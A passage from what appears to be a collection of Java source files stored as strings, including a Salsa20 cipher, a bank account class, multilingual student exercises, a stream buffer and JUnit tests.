javax.swing.GroupLayout.DEFAULT_SIZE, 170, Short.MAX_VALUE))\n                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, 55, Short.MAX_VALUE)\n                .addGroup(jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING, false)\n                    .addComponent(jButton1, javax.swing.GroupLayout.DEFAULT_SIZE, javax.sw",
    "import java.io.*;\n\npublic class Salsa20 {\n    byte[] key;\n    byte[] nonce;\n\n    /**\n     * constructor used only for testing purposes\n     */\n    public Salsa20() {}\n\n    /**\n     * This constructor takes both key and nonce as strings and converts them to bytes. If a nonce should be zero,\n     * an empty String should be provided. The constructor lets the user choose whether they want to operate on\n     * a 16-bit or a 32-bit key. If given key or nonce Strings are longer than their byte sizes, they are truncated\n     * @param key the 16 or 32-bit key\n     * @param nonce the\n     * @param keyMode\n     */\n    public Salsa20(String key, String nonce, int keyMode) {\n        if ( keyMode != 32 && keyMode != 16 ) {\n            IllegalArgumentException e = new IllegalArgumentException(\"Illegal argument in the constructor!\");\n            throw e;\n        }\n        this.nonce = new byte[8];\n\n        byte[] keyBytes = key.getBytes();\n        byte[] nonceBytes = nonce.getBytes();\n\n        // Filling the key array to chosen length\n        int length = key.length();\n        if (length <= keyMode) {\n            this.key = new byte[keyMode];\n            fillToKeySize(keyBytes, length, keyMode);\n        } else {\n            this.key = new byte[keyMode];\n            for (int i = 0; i < keyMode; i++) {\n                this.key[i] = keyBytes[i];\n            }\n        }\n        // Filling the nonce to proper length\n        length = nonceBytes.length;\n        if ( length < 8 ) {\n            fillNonce(nonceBytes, length);\n        } else if ( length == 8 ) {\n            this.nonce = nonceBytes;\n        } else {\n            for (int i = 0; i < 8; i++) {\n                this.nonce[i] = nonceBytes[i];\n            }\n        }\n    }\n\n    /**\n     * Helper method. Used in the constructor to fill a nonce, which was given a value shorter than 8 bytes\n     * @param input\n     * @param currentLength\n     */\n    private void fillNonce(byte[] input, int currentLength) {\n        int i = 0;\n        for ( ; i < currentLength; i++ ) {\n            nonce[i] = input[i];\n        }\n        for ( ; i < 8; i++ ) {\n            nonce[i] = 0;\n        }\n    }\n\n    /**\n     * Helper method for the constructor. Used for filling the key, which was given a value shorter than the specified one\n     * @param givenKey the key bytes taken from String\n     * @param currentLength the length of the key byte array\n     * @param desiredLength the key length chosen by the user\n     */\n    private void fillToKeySize(byte[] givenKey, int currentLength, int desiredLength) {\n        for (int i = 0; i < currentLength; i++) {\n            key[i] = givenKey[i];\n        }\n        for (int i = currentLength; i < desiredLength; i++) {\n            key[i] = 0;\n        }\n    }\n\n    public int[] quarterRound(int x0, int x1, int x2, int x3) {\n        int[] x = {x0, x1, x2, x3};\n        x[1] = x[1] ^ (Integer.rotateLeft( (x[0] + x[3]), 7) );\n        x[2] = x[2] ^ (Integer.rotateLeft( (x[1] + x[0]), 9) );\n        x[3] = x[3] ^ (Integer.rotateLeft( (x[2] + x[1]), 13) );\n        x[0] = x[0] ^ (Integer.rotateLeft( (x[3] + x[2]), 18) );\n        return x;\n    }\n    public int[] rowRound(int[] x) {\n        if (x.length != 16) {throw new IllegalArgumentException(\"rowRound\");}\n\n        int[] result = new int[16];\n        // 1st four values\n        int[] temp = quarterRound(x[0], x[1], x[2], x[3]);\n        for (int i = 0; i < 4; i++) {\n            result[i] = temp[i];\n        }\n\n        // 2nd four values\n        temp = quarterRound(x[5], x[6], x[7], x[4]);\n        result[5] = temp[0];\n        result[6] = temp[1];\n        result[7] = temp[2];\n        result[4] = temp[3];\n\n        // 3rd four values\n        temp = quarterRound(x[10], x[11], x[8], x[9]);\n        result[10] = temp[0];\n        result[11] = temp[1];\n        result[8] = temp[2];\n        result[9] = temp[3];\n\n        // 4th four values\n        temp = quarterRound(x[15], x[12], x[13], x[14]);\n        result[15] = temp[0];\n        result[12] = temp[1];\n        result[13] = temp[2];\n        result[14] =temp[3];\n        return result;\n    }\n\n    public int[] columnRound(int[] x) {\n        if (x.length != 16) { throw new IllegalArgumentException(\"ColumnRound\"); }\n\n        int[] result = new int[16];\n        int[] temp = new int[4];\n\n        // 1st four values\n        temp = quarterRound(x[0], x[4], x[8], x[12]);\n        for (int i = 0; i < 4; i++) {\n            result[(4 * i) % 16] = temp[i];\n        }\n\n        // 2nd four values\n        temp = quarterRound(x[5], x[9], x[13], x[1]);\n        for (int i = 0; i < 4; i++) {\n            result[((4 * i) + 5) % 16] = temp[i];\n        }\n\n        // 3rd four values\n        temp = quarterRound(x[10], x[14], x[2], x[6]);\n        for (int i = 0; i < 4; i++) {\n            result[((4 * i) + 10) % 16] = temp[i];\n        }\n\n        // 4th four values\n        temp = quarterRound(x[15], x[3], x[7], x[11]);\n        for (int i = 0; i < 4; i++) {\n            result[((4 * i) + 15) % 16] = temp[i];\n        }\n\n   ",
    "package model.entities;\n\nimport model.exceptions.BusinessException;\n\npublic class Account {\n\t\n\tprivate Integer number;\n\tprivate String holder;\n\tprivate Double balance;\n\tprivate Double withdrawLimit;\n\t\n\tAccount(){\n\t}\n\n\tpublic Account(Integer number, String holder, Double balance,\n\t\t\tDouble withdrawLimit) {\n\t\tthis.number = number;\n\t\tthis.holder = holder;\n\t\tthis.balance = balance;\n\t\tthis.withdrawLimit = withdrawLimit;\n\t}\n\n\tpublic Integer getNumber() {\n\t\treturn number;\n\t}\n\n\tpublic void setNumber(Integer number) {\n\t\tthis.number = number;\n\t}\n\n\tpublic String getHolder() {\n\t\treturn holder;\n\t}\n\n\tpublic void setHolder(String holder) {\n\t\tthis.holder = holder;\n\t}\n\n\tpublic Double getBalance() {\n\t\treturn balance;\n\t}\n\n\tpublic void setBalance(Double balance) {\n\t\tthis.balance = balance;\n\t}\n\n\tpublic Double getWithdrawLimit() {\n\t\treturn withdrawLimit;\n\t}\n\n\tpublic void setWithdrawLimit(Double withdrawLimit) {\n\t\tthis.withdrawLimit = withdrawLimit;\n\t}\n\t\n\tpublic void deposit(double amount){\n\t\tbalance += amount;\n\t}\n\t\n\tpublic void withdraw(double amount){\n\t\tvalidateWithdraw(amount);\n\t\tbalance -= amount;\n\t}\n\t\n\tprivate void validateWithdraw(double amount){\n\t\tif (amount > getWithdrawLimit()){\n\t\t\tthrow new BusinessException(\"Withdraw error: The amount exceeds withdraw limit.\");\n\t\t}\n\t\tif (amount > getBalance()){\n\t\t\tthrow new BusinessException(\"Withdraw error: Not enough balance.\");\n\t\t}\n\t}\n\t\n}\n",
    "import java.util.Scanner;\n\n\npublic class Main {\n    public static void main(String[] args) {\n        // \u0412\u044b\u0432\u043e\u0434\u0438\u043c \u043f\u0440\u0438\u0432\u0435\u0442\u0441\u0442\u0432\u0438\u0435 \u0438 \u043c\u0435\u043d\u044e \u0432\u044b\u0431\u043e\u0440\u0430 \u043e\u043f\u0435\u0440\u0430\u0446\u0438\u0438\n        System.out.println(\"\u041f\u0440\u0438\u0432\u0435\u0442!\\n\u0412\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u043e\u0442 1 \u0434\u043e 4:\\n1 - \u0421\u0443\u043c\u043c\u0430\\n2 - \u0423\u043c\u043d\u043e\u0436\u0435\u043d\u0438\u0435\\n3 - \u0414\u0435\u043b\u0435\u043d\u0438\u0435\\n4 - \u0412\u044b\u0447\u0438\u0442\u0430\u043d\u0438\u0435\\n\\nCalculator by wuydjrhdfghjfgd\");\n\n        // \u0421\u043e\u0437\u0434\u0430\u0435\u043c \u0441\u043a\u0430\u043d\u043d\u0435\u0440 \u0434\u043b\u044f \u0441\u0447\u0438\u0442\u044b\u0432\u0430\u043d\u0438\u044f \u0432\u044b\u0431\u043e\u0440\u0430 \u043e\u043f\u0435\u0440\u0430\u0446\u0438\u0438 \u043e\u0442 \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044f\n        Scanner choiceScanner = new Scanner(System.in);\n        int choice = choiceScanner.nextInt(); // \u0421\u0447\u0438\u0442\u044b\u0432\u0430\u0435\u043c \u0432\u044b\u0431\u043e\u0440 \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044f\n\n        // \u0421\u043e\u0437\u0434\u0430\u0435\u043c \u0441\u043a\u0430\u043d\u043d\u0435\u0440\u044b \u0434\u043b\u044f \u0441\u0447\u0438\u0442\u044b\u0432\u0430\u043d\u0438\u044f \u0434\u0432\u0443\u0445 \u0447\u0438\u0441\u0435\u043b \u043e\u0442 \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044f\n        Scanner firstNumberScanner = new Scanner(System.in);\n        Scanner secondNumberScanner = new Scanner(System.in);\n\n        if (choice == 1) { // \u0415\u0441\u043b\u0438 \u0432\u044b\u0431\u0440\u0430\u043d\u0430 \u043e\u043f\u0435\u0440\u0430\u0446\u0438\u044f \"\u0421\u0443\u043c\u043c\u0430\"\n            System.out.println(\"\u0412\u0432\u0435\u0434\u0438 \u043f\u0435\u0440\u0432\u043e\u0435 \u0447\u0438\u0441\u043b\u043e: \");\n            int first = firstNumberScanner.nextInt(); // \u0421\u0447\u0438\u0442\u044b\u0432\u0430\u0435\u043c \u043f\u0435\u0440\u0432\u043e\u0435 \u0447\u0438\u0441\u043b\u043e\n            System.out.println(\"\u0412\u0432\u0435\u0434\u0438 \u0432\u0442\u043e\u0440\u043e\u0435 \u0447\u0438\u0441\u043b\u043e: \");\n            int second = secondNumberScanner.nextInt(); // \u0421\u0447\u0438\u0442\u044b\u0432\u0430\u0435\u043c \u0432\u0442\u043e\u0440\u043e\u0435 \u0447\u0438\u0441\u043b\u043e\n            System.out.println(\"\u0420\u0435\u0437\u0443\u043b\u044c\u0442\u0430\u0442: \" + (first + second)); // \u0412\u044b\u0432\u043e\u0434\u0438\u043c \u0441\u0443\u043c\u043c\u0443 \u0447\u0438\u0441\u0435\u043b\n\n        } else if (choice == 2) { // \u0415\u0441\u043b\u0438 \u0432\u044b\u0431\u0440\u0430\u043d\u0430 \u043e\u043f\u0435\u0440\u0430\u0446\u0438\u044f \"\u0423\u043c\u043d\u043e\u0436\u0435\u043d\u0438\u0435\"\n            System.out.println(\"\u0412\u0432\u0435\u0434\u0438 \u043f\u0435\u0440\u0432\u043e\u0435 \u0447\u0438\u0441\u043b\u043e: \");\n            int first = firstNumberScanner.nextInt();\n            System.out.println(\"\u0412\u0432\u0435\u0434\u0438 \u0432\u0442\u043e\u0440\u043e\u0435 \u0447\u0438\u0441\u043b\u043e: \");\n            int second = secondNumberScanner.nextInt();\n            System.out.println(\"\u0420\u0435\u0437\u0443\u043b\u044c\u0442\u0430\u0442: \" + (first * second)); // \u0412\u044b\u0432\u043e\u0434\u0438\u043c \u043f\u0440\u043e\u0438\u0437\u0432\u0435\u0434\u0435\u043d\u0438\u0435 \u0447\u0438\u0441\u0435\u043b\n\n        } else if (choice == 3) { // \u0415\u0441\u043b\u0438 \u0432\u044b\u0431\u0440\u0430\u043d\u0430 \u043e\u043f\u0435\u0440\u0430\u0446\u0438\u044f \"\u0414\u0435\u043b\u0435\u043d\u0438\u0435\"\n            System.out.println(\"\u0412\u0432\u0435\u0434\u0438 \u043f\u0435\u0440\u0432\u043e\u0435 \u0447\u0438\u0441\u043b\u043e: \");\n            int first = firstNumberScanner.nextInt();\n            System.out.println(\"\u0412\u0432\u0435\u0434\u0438 \u0432\u0442\u043e\u0440\u043e\u0435 \u0447\u0438\u0441\u043b\u043e: \");\n            int second = secondNumberScanner.nextInt();\n            // \u041f\u0440\u043e\u0432\u0435\u0440\u043a\u0430 \u0434\u0435\u043b\u0435\u043d\u0438\u044f \u043d\u0430 \u043d\u043e\u043b\u044c\n            if (second == 0) {\n                System.out.println(\"\u041e\u0448\u0438\u0431\u043a\u0430: \u0434\u0435\u043b\u0435\u043d\u0438\u0435 \u043d\u0430 \u043d\u043e\u043b\u044c \u043d\u0435\u0432\u043e\u0437\u043c\u043e\u0436\u043d\u043e!\");\n            } else {\n                System.out.println(\"\u0420\u0435\u0437\u0443\u043b\u044c\u0442\u0430\u0442: \" + (first / second)); // \u0412\u044b\u0432\u043e\u0434\u0438\u043c \u0447\u0430\u0441\u0442\u043d\u043e\u0435\n            }\n\n        } else if (choice == 4) { // \u0415\u0441\u043b\u0438 \u0432\u044b\u0431\u0440\u0430\u043d\u0430 \u043e\u043f\u0435\u0440\u0430\u0446\u0438\u044f \"\u0412\u044b\u0447\u0438\u0442\u0430\u043d\u0438\u0435\"\n            System.out.println(\"\u0412\u0432\u0435\u0434\u0438 \u043f\u0435\u0440\u0432\u043e\u0435 \u0447\u0438\u0441\u043b\u043e: \");\n            int first = firstNumberScanner.nextInt();\n            System.out.println(\"\u0412\u0432\u0435\u0434\u0438 \u0432\u0442\u043e\u0440\u043e\u0435 \u0447\u0438\u0441\u043b\u043e: \");\n            int second = secondNumberScanner.nextInt();\n            System.out.println(\"\u0420\u0435\u0437\u0443\u043b\u044c\u0442\u0430\u0442: \" + (first - second)); // \u0412\u044b\u0432\u043e\u0434\u0438\u043c \u0440\u0430\u0437\u043d\u043e\u0441\u0442\u044c \u0447\u0438\u0441\u0435\u043b\n\n        } else { // \u0415\u0441\u043b\u0438 \u0432\u044b\u0431\u0440\u0430\u043d\u043e \u043d\u0435\u043a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u043e\u0435 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435\n            System.out.println(\"\u041e\u0448\u0438\u0431\u043a\u0430: \u043d\u0435\u043a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u044b\u0439 \u0432\u044b\u0431\u043e\u0440 \u043e\u043f\u0435\u0440\u0430\u0446\u0438\u0438!\");\n        }\n    }\n}",
    "package org.amine.hnms.controller;\n\nimport org.amine.hnms.DTO.NotificationPerformance;\nimport org.amine.hnms.domain.Click;\nimport org.amine.hnms.domain.Conversion;\nimport org.amine.hnms.domain.Impression;\nimport org.amine.hnms.domain.Notification;\nimport org.amine.hnms.service.INotificationService;\nimport org.junit.jupiter.api.BeforeEach;\nimport org.junit.jupiter.api.Test;\nimport org.mockito.InjectMocks;\nimport org.mockito.Mock;\nimport org.mockito.MockitoAnnotations;\nimport org.springframework.http.HttpStatus;\nimport org.springframework.http.ResponseEntity;\nimport java.time.LocalDateTime;\n\nimport static org.junit.jupiter.api.Assertions.assertEquals;\nimport static org.mockito.Mockito.*;\n\npublic class NotificationControllerTest {\n\n    @Mock\n    private INotificationService notificationService;\n\n    @InjectMocks\n    private NotificationController notificationController;\n\n    @BeforeEach\n    public void setup() {\n        MockitoAnnotations.initMocks(this);\n    }\n\n    @Test\n    public void testGetNotificationById() throws Exception {\n        int notificationId = 1;\n        Notification notification = new Notification();\n        when(notificationService.getOneById(notificationId)).thenReturn(notification);\n\n        ResponseEntity<Notification> response = notificationController.getOneById(notificationId);\n\n        assertEquals(HttpStatus.OK, response.getStatusCode());\n        assertEquals(notification, response.getBody());\n    }\n\n    @Test\n    public void testGetNotificationPerformanceById() throws Exception {\n        int notificationId = 1;\n        LocalDateTime startDate = LocalDateTime.of(2022, 1, 1, 0, 0);\n        LocalDateTime endDate = LocalDateTime.of(2022, 1, 2, 0, 0);\n        NotificationPerformance performance = new NotificationPerformance();\n        when(notificationService.getNotificationPerformance(notificationId, startDate, endDate)).thenReturn(performance);\n\n        ResponseEntity<NotificationPerformance> response = notificationController.getNotificationPerformanceById(notificationId, startDate, endDate);\n\n        assertEquals(HttpStatus.OK, response.getStatusCode());\n        assertEquals(performance, response.getBody());\n    }\n\n    @Test\n    public void testAddClick() throws Exception {\n        int notificationId = 1;\n        Click click = new Click();\n        when(notificationService.addClick(notificationId, click)).thenReturn(click);\n\n        ResponseEntity<Click> response = notificationController.addClick(notificationId, click);\n\n        assertEquals(HttpStatus.CREATED, response.getStatusCode());\n        assertEquals(click, response.getBody());\n    }\n\n    @Test\n    public void testAddImpression() {\n        int notificationId = 1;\n        Impression impression = new Impression();\n        when(notificationService.addImpression(notificationId, impression)).thenReturn(impression);\n\n        ResponseEntity<Impression> response = notificationController.addImpression(notificationId, impression);\n\n        assertEquals(HttpStatus.CREATED, response.getStatusCode());\n        assertEquals(impression, response.getBody());\n    }\n\n    @Test\n    public void testAddConversion() {\n        int notificationId = 1;\n        Conversion conversion = new Conversion();\n        when(notificationService.addConversion(notificationId, conversion)).thenReturn(conversion);\n\n        ResponseEntity<Conversion> response = notificationController.addConversion(notificationId, conversion);\n\n        assertEquals(HttpStatus.CREATED, response.getStatusCode());\n        assertEquals(conversion, response.getBody());\n    }\n}\n",
    "package view;\r\n\r\nimport java.awt.BorderLayout;\r\nimport java.awt.Color;\r\nimport java.awt.Dimension;\r\n\r\nimport javax.swing.JLabel;\r\nimport javax.swing.JPanel;\r\nimport javax.swing.SwingConstants;\r\n\r\nimport model.UserModel;\r\n\r\n/**\r\n * La classe PlayerInfoView rappresenta la vista delle informazioni del giocatore.\r\n */\r\npublic class PlayerInfoView extends JPanel {\r\n    private static final long serialVersionUID = 1L;\r\n\r\n    /**\r\n     * Crea una nuova istanza di PlayerInfoView associata a un utente specifico.\r\n     *\r\n     * @param user L'utente associato a questa vista delle informazioni del giocatore.\r\n     */\r\n    public PlayerInfoView(UserModel user) {\r\n        setLayout(new BorderLayout());\r\n        setPreferredSize(new Dimension(80, 160)); // Imposta le dimensioni del componente\r\n        setBackground(new Color(128, 128, 0));\r\n        AvatarView avatarView = new AvatarView(user);\r\n        avatarView.setPreferredSize(new Dimension(80, 80));\r\n        avatarView.setBackground(new Color(153, 153, 255));\r\n\r\n        // Etichetta con il nome del giocatore\r\n        JLabel playerNameLabel = new JLabel(user.getNickname());\r\n        playerNameLabel.setBackground(new Color(153, 153, 255));\r\n        playerNameLabel.setOpaque(true);\r\n        playerNameLabel.setHorizontalAlignment(SwingConstants.CENTER);\r\n        playerNameLabel.setPreferredSize(new Dimension(80, 40));\r\n\r\n        // Etichetta con il livello del giocatore\r\n        JLabel playerLevelLabel = new JLabel(\"Livello: \" + user.getLevel());\r\n        playerLevelLabel.setBackground(new Color(153, 153, 255));\r\n        playerLevelLabel.setOpaque(true);\r\n        playerLevelLabel.setHorizontalAlignment(SwingConstants.CENTER);\r\n        playerLevelLabel.setPreferredSize(new Dimension(80, 40));\r\n\r\n        add(avatarView, BorderLayout.CENTER);\r\n        add(playerNameLabel, BorderLayout.NORTH);\r\n        add(playerLevelLabel, BorderLayout.SOUTH);\r\n    }\r\n}\r\n",
    "package com.campusdual.classroom;\n\npublic class Exercise04 {\n    public static void main(String[] args) {\n\n        System.out.println(\"Ejemplos de c\u00e1lculos SIN estructuras de control:\");\n        System.out.println(\"Suma de los primeros 5 n\u00fameros: \" + (1 + 2 + 3 + 4 + 5));\n        System.out.println(\"Suma de los primeros 20 n\u00fameros pares: \" + (2 + 4 + 6 + 8 + 10 + 12 + 14 + 16 + 18 + 20 + 22 + 24 + 26 + 28 + 30 + 32 + 34 + 36 + 38 + 40));\n        System.out.println(\"Obt\u00e9n el factorial del n\u00famero 7 \u2192 (7!): \" + (7 * 6 * 5 * 4 * 3 * 2 * 1));\n        System.out.println(\"######################################################################\");\n        System.out.println(\"Ejemplos de c\u00e1lculos CON estructuras de control:\");\n        System.out.println(sumNum(5));\n        System.out.println(sumEvenNum(20));\n        System.out.println(factorial(7));\n        System.out.println(recursiveFactorial(7));\n    }\n\n    public static int sumNum(int num) {\n        int ret = 0;\n        for(int i = 0; i <= num; i++){\n            ret += i;\n        }\n        return ret;\n    }\n\n    public static int sumEvenNum(int num) {\n        int i = 0;\n        int par = 0;\n        int suma = 0;\n        while(num > i){\n            par += 2;\n            suma += par;\n            i++;\n        }\n        return suma;\n    }\n\n    public static int factorial(int num) {\n        int factorial = 1;\n        for(int i = 1; i <= num; i++){\n            factorial *= i;\n        }\n        return factorial;\n    }\n\n    public static int recursiveFactorial(int num) {\n        int numFactorial = 1;\n        if(num != 0){\n            numFactorial = num * factorial(num - 1);\n        }\n        return numFactorial;\n    }\n}\n",
    "package xyz.kzkr.vvtalk;\n\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InterruptedIOException;\nimport java.io.OutputStream;\nimport java.nio.ByteBuffer;\nimport java.util.Objects;\n\npublic class ByteArrayIOBuffer{\n\tprivate final ByteBuffer buf;\n\tprivate int rpos;//\u8aad\u307f\u8fbc\u307f\u57fa\u70b9\n\tprivate int wpos;//\u66f8\u304d\u8fbc\u307f\u57fa\u70b9\n\tprivate int size;//\u6709\u52b9\u30c7\u30fc\u30bf\u6570\n\tprivate boolean eof;//\u66f8\u304d\u8fbc\u307f\u7d42\u4e86\n\tprivate Object lock=new Object();\n\tprivate Object wwait=new Object();//\u66f8\u304d\u5f85\u3061\n\tprivate Object rwait=new Object();//\u8aad\u307f\u5f85\u3061\n\tprivate Input is;\n\tprivate Output os;\n\tpublic ByteArrayIOBuffer(byte[] b){\n\t\tthis(ByteBuffer.wrap(b));\n\t}\n\tpublic ByteArrayIOBuffer(ByteBuffer b){\n\t\tbuf=Objects.requireNonNull(b);\n\t\tif(buf.capacity()<1) throw new java.lang.IllegalArgumentException(\"buffer length < 1\");\n\t\tif(buf.isReadOnly()) throw new java.lang.IllegalArgumentException(\"buffer ReadOnly\");\n\t\tis=new Input();\n\t\tos=new Output();\n\t}\n\tpublic InputStream getInputStream() {\n\t\treturn is;\n\t}\n\tpublic OutputStream getOutputStream() {\n\t\treturn os;\n\t}\n\tprivate class Input extends InputStream{\n\t\tbyte[] b1=new byte[1];\n\t\t@Override\n\t\tpublic synchronized int read() throws IOException{\n\t\t\tread(b1,0,1);\n\t\t\tif(b1[0]==-1)return -1;\n\t\t\treturn b1[0]&0xFF;\n\t\t}\n\t\t@Override\n\t\tpublic synchronized int read(byte b[],int off,int len) throws IOException{\n\t\t\tObjects.checkFromIndexSize(off,len,b.length);\n\t\t\tif(len==0)return 0;\n\t\t\tint readCount=0;\n\t\t\twhile(len>0){\n\t\t\t\tif(eof&&size<1) break;\n\t\t\t\tif(readCount>0&&size<1)return readCount;\n\t\t\t\tint r=0;\n\t\t\t\tsynchronized(lock){\n\t\t\t\t\tif(size>0) {\n\t\t\t\t\t\tr+=readSub(b,off,Math.min(size,len));\n\t\t\t\t\t\tsynchronized(rwait) {\n\t\t\t\t\t\t\trwait.notify();\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tsynchronized(wwait) {\n\t\t\t\t\tif(r<1){\n\t\t\t\t\t\ttry{\n\t\t\t\t\t\t\twwait.wait();\n\t\t\t\t\t\t}catch(InterruptedException e){\n\t\t\t\t\t\t\tthrow new InterruptedIOException();\n\t\t\t\t\t\t}\n\t\t\t\t\t\tcontinue;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tlen-=r;\n\t\t\t\toff+=r;\n\t\t\t\treadCount+=r;\n\t\t\t}\n\t\t\tif(readCount==0&&eof)return -1;\n\t\t\treturn readCount;\n\t\t}\n\t\tprivate int readSub(byte[] b,int off,int len) {\n\t\t\tint pos=rpos+len;\n\t\t\tif(pos>=buf.capacity())pos=buf.capacity();\n\t\t\tint s=pos-rpos;\n\t\t\tbuf.position(rpos);\n\t\t\tbuf.get(b,off,s);\n\t\t\trpos+=s;\n\t\t\tif(rpos>=buf.capacity()) {\n\t\t\t\trpos=0;\n\t\t\t}\n\t\t\tsize-=s;\n\t\t\treturn s;\n\t\t}\n\t\t@Override\n\t\tpublic synchronized long skip(long len) throws IOException {\n\t\t\tif(len<0)return 0;\n\t\t\tlen=Math.min(size,len);\n\t\t\tint pos=(int) (Math.min(len+rpos,Integer.MAX_VALUE));\n\t\t\tif(pos<0)return 0;\n\t\t\tif(pos>=buf.capacity())pos=buf.capacity();\n\t\t\tint skip=pos-rpos;\n\t\t\tif(skip>0) {\n\t\t\t\trpos+=skip;\n\t\t\t\tif(rpos>=buf.capacity()) {\n\t\t\t\t\trpos=0;\n\t\t\t\t}\n\t\t\t\tsize-=skip;\n\t\t\t\tsynchronized(rwait) {\n\t\t\t\t\trwait.notify();\n\t\t\t\t}\n\t\t\t}\n\t\t\treturn skip;\n\t\t}\n\t\t@Override\n\t\tpublic int available() {\n\t\t\treturn size;\n\t\t}\n\t}\n\tprivate class Output extends OutputStream{\n\t\tbyte[] b1=new byte[1];\n\t\t@Override\n\t\tpublic synchronized void write(int b) throws IOException{\n\t\t\tb1[0]=(byte) b;\n\t\t\twrite(b1,0,1);\n\t\t}\n\t\t@Override\n\t\tpublic synchronized void write(byte b[],int off,int len) throws IOException{\n\t\t\tObjects.checkFromIndexSize(off,len,b.length);\n\t\t\twhile(len>0){\n\t\t\t\tif(eof) throw new IOException(\"Stream Closed\");\n\t\t\t\tint w=0,bufferEmpty;\n\t\t\t\tsynchronized(lock){\n\t\t\t\t\tbufferEmpty=buf.capacity()-size;//\u5bb9\u91cf-\u4f7f\u7528\u6e08=\u7a7a\u304d\n\t\t\t\t\t//\u7a7a\u304d\u5bb9\u91cf\u304b\u66f8\u304d\u8fbc\u307f\u5e0c\u671b\u306e\u5c0f\u3055\u3044\u65b9\u3092\u66f8\u304d\u8fbc\u3093\u3067\n\t\t\t\t\tif(bufferEmpty>0) {\n\t\t\t\t\t\tw=writeSub(b,off,Math.min(bufferEmpty,len));\n\t\t\t\t\t\tif(w>0)synchronized(wwait) {\n\t\t\t\t\t\t\twwait.notify();\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tsynchronized(rwait) {\n\t\t\t\t\tif(bufferEmpty<1){\n\t\t\t\t\t\ttry{\n\t\t\t\t\t\t\trwait.wait();\n\t\t\t\t\t\t}catch(InterruptedException e){\n\t\t\t\t\t\t\tthrow new InterruptedIOException();\n\t\t\t\t\t\t}\n\t\t\t\t\t\tcontinue;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\t//\u66f8\u304d\u8fbc\u3081\u305f\u91cf\u3060\u3051\u66f8\u304d\u8fbc\u307f\u305f\u3044\u91cf\u304b\u3089\u6e1b\u3089\u3059\n\t\t\t\tlen-=w;\n\t\t\t\toff+=w;\n\t\t\t}\n\t\t}\n\t\tprivate int writeSub(byte[] b,int off,int len){\n\t\t\tint alen=wpos+len;\n\t\t\tif(alen>=buf.capacity())alen=buf.capacity();//\u8d85\u904e\u5f8c\u534a\n\t\t\tint sw=alen-wpos;\n\t\t\tbuf.position(wpos);\n\t\t\tbuf.put(b,off,sw);\n\t\t\tsize+=sw;\n\t\t\twpos+=sw;\n\t\t\tif(wpos>=buf.capacity()) {\n\t\t\t\twpos=0;\n\t\t\t}\n\t\t\treturn sw;\n\t\t}\n\t\t@Override\n\t\tpublic void close(){\n\t\t\teof=true;\n\t\t\tsynchronized(rwait) {\n\t\t\t\trwait.notify();\n\t\t\t}\n\t\t\tsynchronized(wwait) {\n\t\t\t\twwait.notify();\n\t\t\t}\n\t\t}\n\t}\n\tpublic boolean isClosed() {\n\t\treturn eof;\n\t}\n}\n",
    "package edu.pitt.cs;\n\nimport org.junit.Test;\nimport static org.junit.Assert.*;\n\nimport org.junit.After;\nimport org.junit.Before;\nimport org.junit.FixMethodOrder;\nimport org.junit.runners.MethodSorters;\n\n@FixMethodOrder(MethodSorters.NAME_ASCENDING)\npublic class CatUnitTest {\n\n\t/**\n\t * The test fixture for this JUnit test. Test fixture: a fixed state of a set of\n\t * objects used as a baseline for running tests. The test fixture is initialized\n\t * using the @Before setUp method which runs before every test case. The test\n\t * fixture is removed using the @After tearDown method which runs after each\n\t * test case.\n\t */\n\n\tCat c; // cat object\n\n\t@Before\n\tpublic void setUp() throws Exception {\n\t\t// INITIALIZE THE TEST FIXTURE\n\n\t\t// Create a Cat with ID 1 and name \"Jennyanydots\", assign to c using a call to Cat.createInstance(InstanceType, int, String).\n\t\t// Passing InstanceType.IMPL as the first parameter will create a real cat using your CatImpl implementation.\n\t\t// Passing InstanceType.MOCK as the first parameter will create a mock cat using Mockito.\n\t\t// Which type is the correct choice for this unit test?  I'll leave it up to you.  The answer is in the Unit Testing Part 2 lecture. :)\n\t\tc = Cat.createInstance(InstanceType.IMPL, 1, \"Jennyanydots\");\n\t}\n\n\t@After\n\tpublic void tearDown() throws Exception {\n\t\t// Not necessary strictly speaking since the references will be overwritten in\n\t\t// the next setUp call anyway and Java has automatic garbage collection.\n\t\tc = null;\n\t}\n\n\t/**\n\t * Test case for int getId().\n\t * \n\t * <pre>\n\t * Preconditions: c has been created with ID 1, and name \"Jennyanydots\".\n\t * Execution steps: Call c.getId().\n\t * Postconditions: Return value is 1.\n\t * </pre>\n\t */\n\t@Test\n\tpublic void testGetId() {\n\t\tassertEquals(1, c.getId());\n\t}\n\n\t/**\n\t * Test case for int getName().\n\t * \n\t * <pre>\n\t * Preconditions: c has been created with ID 1, and name \"Jennyanydots\".\n\t * Execution steps: Call c.getName().\n\t * Postconditions: Return value is 1.\n\t * </pre>\n\t */\n\t@Test\n\tpublic void testGetName() {\n\t\tassertEquals(\"Jennyanydots\", c.getName());\n\t}\n\n\t/**\n\t * Test case for int getRented().\n\t * \n\t * <pre>\n\t * Preconditions: c has been created with ID 1, and name \"Jennyanydots\".\n\t * Execution steps: Call c.getRented().\n\t * Postconditions: Return value is false.\n\t * </pre>\n\t */\n\t@Test\n\tpublic void testGetRented() {\n\t\tassertFalse(c.getRented());\n\t}\n\n\t/**\n\t * Test case for int toString().\n\t * \n\t * <pre>\n\t * Preconditions: c has been created with ID 1, and name \"Jennyanydots\".\n\t * Execution steps: Call c.toString().\n\t * Postconditions: Return value is \"ID 1. Jennyanydots\".\n\t * </pre>\n\t */\n\t@Test\n\tpublic void testToString() {\n\t\tassertEquals(\"ID 1. Jennyanydots\", c.toString());\n\t}\n\n\t/**\n\t * Test case for int rentCat().\n\t * \n\t * 